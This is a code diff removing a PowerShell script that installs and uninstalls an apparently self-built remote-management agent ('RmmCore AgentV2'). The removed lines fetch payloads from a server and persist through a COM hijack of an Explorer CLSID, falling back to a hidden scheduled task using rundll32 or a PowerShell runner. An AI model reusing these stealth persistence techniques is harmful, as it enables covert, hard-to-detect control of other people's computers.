-        $svc = New-Object -ComObject 'Schedule.Service'
-        $svc.Connect()
-        $svc.GetFolder('\').DeleteTask('RmmCoreV2', 0)
-    }
-    catch { }
-    Stop-RmmCoreUser -Dir $Dir
-
-    $keysRemoved = Unregister-V2Cache
-    if ($keysRemoved -gt 0) {
-        Write-Host ("  cache Explorer removido ({0})" -f $keysRemoved)
-    }
-    if (-not $SkipExplorerRestart) {
-        Restart-ExplorerShell
-        Start-Sleep -Seconds 2
-    }
-
-    $legacy = Join-Path $env:LOCALAPPDATA 'RmmCore\v2'
-    foreach ($d in @($Dir, $legacy)) {
-        if ([string]::IsNullOrWhiteSpace($d) -or -not (Test-Path -LiteralPath $d)) { continue }
-        foreach ($n in $Script:V2PayloadNames) {
-            $p = Join-Path $d $n
-            if (Test-Path -LiteralPath $p) {
-                Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
-                if (-not (Test-Path -LiteralPath $p)) {
-                    Write-Host "  Removed $p"
-                }
-                else {
-                    Write-Warning "Ainda em uso: $p (fecha Explorer e volta a -Remove)"
-                }
-            }
-        }
-        Get-ChildItem -LiteralPath $d -Filter 'usercache*.dll' -ErrorAction SilentlyContinue |
-            Remove-Item -Force -ErrorAction SilentlyContinue
-        Get-ChildItem -LiteralPath $d -Filter '*.tmp' -ErrorAction SilentlyContinue |
-            Remove-Item -Force -ErrorAction SilentlyContinue
-    }
-    if (Test-Path -LiteralPath $legacy) {
-        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
-        if (-not (Test-Path -LiteralPath $legacy)) {
-            Write-Host "  Removed $legacy"
-        }
-    }
-
-    $sysSvc = Get-Service -Name RmmCoreV2Svc -ErrorAction SilentlyContinue
-    if ($sysSvc) {
-        Write-Host '  Servico RmmCoreV2Svc ainda presente. Admin: install-service.ps1 -Action Uninstall'
-    }
-    $ErrorActionPreference = $prev
-    Write-Host 'AgentV2 user remove OK'
-}
-
-#endregion
-
-if ($Remove) { $Action = 'Remove' }
-if ($Action -eq 'Remove') {
-    Invoke-RemoveV2UserInstall -Dir $DataDir -SkipExplorerRestart:$NoRestartExplorer
-    return
-}
-if ([string]::IsNullOrWhiteSpace($Config)) {
-    throw 'Install requer -Config (ou use -Remove).'
-}
-
-$server = Get-ServerBase $Config
-New-Item -ItemType Directory -Force -Path $DataDir | Out-Null
-
-$legacyDir = Join-Path $env:LOCALAPPDATA 'RmmCore\v2'
-$legacyStore = Join-Path $legacyDir 'agent.store.enc'
-$newStore = Join-Path $DataDir 'agent.store.enc'
-if ((Test-Path -LiteralPath $legacyStore) -and -not (Test-Path -LiteralPath $newStore)) {
-    Copy-Item -LiteralPath $legacyStore -Destination $newStore -Force
-    Write-Host "Migrado agent.store.enc de $legacyDir"
-}
-
-Stop-RmmCoreUser -Dir $DataDir
-Save-ComCorePayload -ServerBase $server -Dir $DataDir
-
-$taskOnly = $HostMode -in @('Rundll32', 'Native', 'PowerShell')
-if (-not $taskOnly) {
-    try {
-        Write-Host "COM Hijack (cache Explorer) — sem Host.exe / rundll / run-v2.ps1"
-        Write-V2UserBootstrap -Dir $DataDir -ServerBase $server -Mode $HostMode
-        Install-V2Cache -Dir $DataDir -TargetClsid $Clsid -Arch $Architecture -SkipExplorerRestart:$NoRestartExplorer
-        Write-Host ("AgentV2 COM OK -> {0} (so RmmCore.dll + usercache.dll)" -f $DataDir)
-        return
-    }
-    catch {
-        if ($HostMode -eq 'Shell') { throw }
-        Write-Warning ("cache Explorer falhou — fallback task: {0}" -f $_.Exception.Message)
-        $null = Unregister-V2Cache
-    }
-}
-
-$cacheRemoved = Unregister-V2Cache
-if ($cacheRemoved -gt 0) {
-    Write-Host "Removido cache Explorer residual ($cacheRemoved) — a usar task."
-    Restart-ExplorerShell
-}
-
-$runnerPath = Save-TaskFallbackPayload -ServerBase $server -Dir $DataDir
-Write-V2UserBootstrap -Dir $DataDir -ServerBase $server -Mode $HostMode -IncludeTaskHosts
-
-$cascadeMode = if ($HostMode -in @('Rundll32', 'Native', 'PowerShell')) { $HostMode } else { 'Auto' }
-$nativeExe = Join-Path $DataDir 'RmmCore.Host.exe'
-$rundllDll = Join-Path $DataDir 'RmmCore.Rundll.dll'
-
-$result = Start-HostCascade -Dir $DataDir -NativeExe $nativeExe -RundllDll $rundllDll `
-    -RunnerPath $runnerPath -Mode $cascadeMode
-
-if (-not $result.Ok) {
-    throw 'AgentV2 user install falhou: cache Explorer / rundll32 / Host.exe / run-v2 nenhum ficou activo.'
-}
-
-Write-Host ('AgentV2 user install OK -> {0} (host={1}; no SYSTEM service; task Hidden)' -f $DataDir, $result.Mode)
+        private const string ClsidRoot = @"Software\Classes\
